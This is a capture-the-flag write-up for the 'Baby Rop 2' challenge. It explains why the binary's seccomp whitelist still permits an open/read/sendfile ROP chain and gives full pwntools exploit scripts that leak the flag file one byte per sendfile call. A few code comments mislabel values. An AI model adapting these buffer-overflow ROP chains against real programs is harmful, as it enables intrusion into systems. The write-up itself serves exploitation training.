# Pwn - Baby Rop 2
- Solved by: @Elma
- Flag: **-UNKNOWN-**

## Writeup

This challenge is identical to that of Baby ROP, but introduces **seccomp** protections. This writeup assumes that the reader has read the writeup for Baby Rop 1.

### What's new?

```c
void setup_seccomp()
{
  int v1 = seccomp_init(0LL);
  seccomp_rule_add(v1, SECCOMP_RET_ALLOW, SYS_read, 0);
  seccomp_rule_add(v1, SECCOMP_RET_ALLOW, SYS_write, 0);
  seccomp_rule_add(v1, SECCOMP_RET_ALLOW, SYS_open, 0);
  seccomp_rule_add(v1, SECCOMP_RET_ALLOW, SYS_close, 0);
  seccomp_rule_add(v1, SECCOMP_RET_ALLOW, SYS_sendfile, 0);
  seccomp_load(v1);
}
```

This function was introduced to the program, which is essentially a whitelist of syscalls that is allowed by the program. The rest of the program is identical to that of Baby Rop 1.

Our exploit previously used the `read`, `open`, `sendfile` syscalls, which are all whitelisted. This means that the seccomp filter does not matter to us, and we can reuse our exploit.

### Exploit

Although the program is mostly similar, the offsets for all our ROP gadgets has changed, so we will need to find the address of the gadgets again. Same goes for our writeable memory to store the `flag.txt` string.

```py
from pwn import *
context.binary = elf = ELF("./baby_rop2")

p = process("./baby_rop2")

pop_rdi = 0x00000000004038e3
pop_rsi = 0x0000000000402458
pop_rdx_rbx = 0x000000000048d02b
pop_rax = 0x0000000000456ee7
syscall = 0x00000000004227e6

#### Part 1: Read Syscall

p1 = b"A"*120
p1 += p64(pop_rax) + p64(0x0)                   # syscall_num = 0 (read)
p1 += p64(pop_rdi) + p64(0x0)                   # fd = stdin
p1 += p64(pop_rsi) + p64(0x4e1000)              # buf = 0x4c63b0
p1 += p64(pop_rdx_rbx) + p64(0x8) + p64(0x0)    # size = 0x8, RBX is junk
p1 += p64(syscall)                              # read "flag.txt" into .bss
p1 += p64(elf.sym.vuln)                         # loop back to vuln for second round of ROP chain since our input is not long enough to squeeze everything into one

#### Part 2: Open Syscall

p2 = b"A"*120
p2 += p64(pop_rax) + p64(0x2)           # syscall num = 2 (open)
p2 += p64(pop_rdi) + p64(0x4e1000)      # fname = 0x4c63b0
p2 += p64(pop_rsi) + p64(0x0)           # flags = 0 (open)
p2 += p64(pop_rdx_rbx) + p64(0x0) * 2   # mode = 0 (open)
p2 += p64(syscall)                      # open file and get new file descriptor for flag.txt
p2 += p64(elf.sym.vuln)                 # loop back to vuln for final rop chain

#### Part 3: Sendfile flag from flag.txt to stdout

p3 = b"A"*120
p3 += p64(pop_rax) + p64(40)            # syscall_num = 40 (sendfile)
p3 += p64(pop_rdi) + p64(1)             # out_fd = stdout (1)
p3 += p64(pop_rsi) + p64(3)             # in_fd = stdout (3)
p3 += p64(pop_rdx_rbx) + p64(0) * 2     # offset = 0
p3 += p64(syscall)                      # write flag to stdout

p.sendline(p1)
p.send(b"flag.txt")

p.sendline(p2)

p.sendline(p3)

p.interactive()
```

If we try to run this, we notice that only one character of the flag pops up. We can debug this by running it with GDB, and we will notice that our **count** argument is being set to `0x1`.

```
[+] Detected syscall (arch:X86, mode:64)
    sendfile(int out_fd, int in_fd, loff_t __user *offset, size_t count)
[+] Parameter            Register             Value
    RET                  $rax                 -
    _NR                  $rax                 0x28
    out_fd               $rdi                 0x0000000000000001
    in_fd                $rsi                 0x0000000000000003
    offset               $rdx                 0x0000000000000000
    count                $r10                 0x0000000000000001
```

This is rather troublesome, because it is difficult to find a gadget that is able to write `r10`. After racking my brain for some time, I realize that I can just keep calling `sendfile` syscall multiple times and it would print out the next single character of the flag.

How this works is that when we open a file, there will exist some file struct in kernelspace that contains metadata about this file. For every open file descriptor, there is a `start`, `cur`, and `end` pointer to the buffer of the file.

Intuitively, `start` and `end` points to the start and end of the contents of the file. The `cur` pointer will increment everytime we request to read the file. This means that everytime we call a `sendfile` syscall with size of `0x1`, it will read us one byte pointed by `cur`, and then increment the `cur` pointer by 1, so that next time when we read it again, we will be reading the next chracter.

With that knowledge, we can easily solve this by looping our last payload. Here is the final solve script.

```py
from pwn import *
context.binary = elf = ELF("./baby_rop2")

p = process("./baby_rop2")

pop_rdi = 0x00000000004038e3
pop_rsi = 0x0000000000402458
pop_rdx_rbx = 0x000000000048d02b
pop_rax = 0x0000000000456ee7
syscall = 0x00000000004227e6

#### Part 1: Read Syscall

p1 = b"A"*120
p1 += p64(pop_rax) + p64(0x0)                   # syscall_num = 0 (read)
p1 += p64(pop_rdi) + p64(0x0)                   # fd = stdin
p1 += p64(pop_rsi) + p64(0x4e1000)              # buf = 0x4c63b0
p1 += p64(pop_rdx_rbx) + p64(0x8) + p64(0x0)    # size = 0x8, RBX is junk
p1 += p64(syscall)                              # read "flag.txt" into .bss
p1 += p64(elf.sym.vuln)                         # loop back to vuln for second round of ROP chain since our input is not long enough to squeeze everything into one

#### Part 2: Open Syscall

p2 = b"A"*120
p2 += p64(pop_rax) + p64(0x2)           # syscall num = 2 (open)
p2 += p64(pop_rdi) + p64(0x4e1000)      # fname = 0x4c63b0
p2 += p64(pop_rsi) + p64(0x0)           # flags = 0 (open)
p2 += p64(pop_rdx_rbx) + p64(0x0) * 2   # mode = 0 (open)
p2 += p64(syscall)                      # open file and get new file descriptor for flag.txt
p2 += p64(elf.sym.vuln)                 # loop back to vuln for final rop chain

#### Part 3: Sendfile flag from flag.txt to stdout

p3 = b"A"*120
p3 += p64(pop_rax) + p64(40)            # syscall_num = 40 (sendfile)
p3 += p64(pop_rdi) + p64(1)             # out_fd = stdout (1)
p3 += p64(pop_rsi) + p64(3)             # in_fd = stdout (3)
p3 += p64(pop_rdx_rbx) + p64(0) * 2     # offset = 0
p3 += p64(syscall)                      # write flag to stdout
p3 += p64(elf.sym.vuln)                 # loop back to vuln to keep reading subsequent characters

p.sendline(p1)
p.send(b"flag.txt")

p.sendline(p2)

for i in range(50):
    p.sendline(p3)

p.interactive()
```
